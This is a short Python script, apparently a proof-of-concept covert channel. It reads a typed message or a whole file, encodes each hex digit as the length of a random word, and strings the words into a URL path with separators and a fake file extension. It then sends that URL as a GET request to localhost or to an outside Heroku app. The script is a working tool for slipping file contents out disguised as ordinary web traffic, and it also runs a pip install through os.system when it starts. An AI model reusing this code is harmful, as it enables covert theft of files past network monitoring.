import os
os.system("pip3 install requests")

import random
import requests
import string
import binascii

def msg_input():
    txt_or_file = input("Enter T for text, F for file: ")
    if txt_or_file == "T":
        msg = input("Enter Message: ")  
        msg_to_hex = [hex(ord(char)) for char in msg] 
        print(f"{msg} in hex bytes:", msg_to_hex)
    else:
        filepath = input("Enter filepath: ")
        with open(filepath, 'r') as f:
            file = f.read().rstrip()
        msg_to_hex = binascii.hexlify(file.encode("utf-8"))
        print(f"{filepath} in hex bytes:", msg_to_hex)
    web_or_serv = input("Connect to the Server (S) or Website (W): ") #"Connect to the Server (S) or Website (W): "
    return msg_to_hex, web_or_serv

def randomised_word(msg_to_hex): #The function responsible for generating the word
    """Function splits the 2 character hex value for each byte and creates a word of length len(hex_char[i]) dynamically"""
    hex_wordlist = []
    for value in msg_to_hex:
        print("value: ", value)
        if type(value) == str:
            hex_values = value.split("x")[1]
        else:
            hex_values = str(value)
        for char in hex_values: #Split the string away from the 0x hex indicator
            print(f"Hex value {hex_values} split for hex_word_length: " + char)
            lowercase_letters = string.ascii_lowercase
            hex_word_length = int(char, 16) + 1 #The length of the hex value as an int
            hex_word = ''
            while len(hex_word) != hex_word_length:
                hex_word += random.choice(lowercase_letters) #Selects a random character on each iteration
            hex_wordlist.append(hex_word)
            print(f"Hex word {hex_word} represents {char}")
    return hex_word, hex_wordlist

if __name__ == "__main__":
    input, web_or_serv = msg_input()
    hex_word, hex_wordlist = randomised_word(input) # words used to represent hex value length from 1-16
    payload = ''    #to replace the URI
    for position, hex_word in enumerate(hex_wordlist): 
        special_char = ["-", "_", "&", "!"] # special char used to separate hex words
        file_type = [".jpg", ".zip", ".txt", ".pdf", ".html"] # file type to close the url
        if position % 2 == 0: 
            payload += hex_word + f"{random.choice(special_char)}" # special_char separates the hex characters
        else:
            if hex_word == hex_wordlist[-1]:
                payload += hex_word + f"{random.choice(file_type)}"
            else:
                payload += hex_word + "/" # "/" separates the hex bytes
    
    if web_or_serv == "S":
        base_name = "http://locaLhost:9999/"
    else:
        base_name = "http://frozen-ravine-68174.herokuapp.com/"
    url = base_name + payload 
    requests.get(url)
    print(requests.get(url))
    print(url)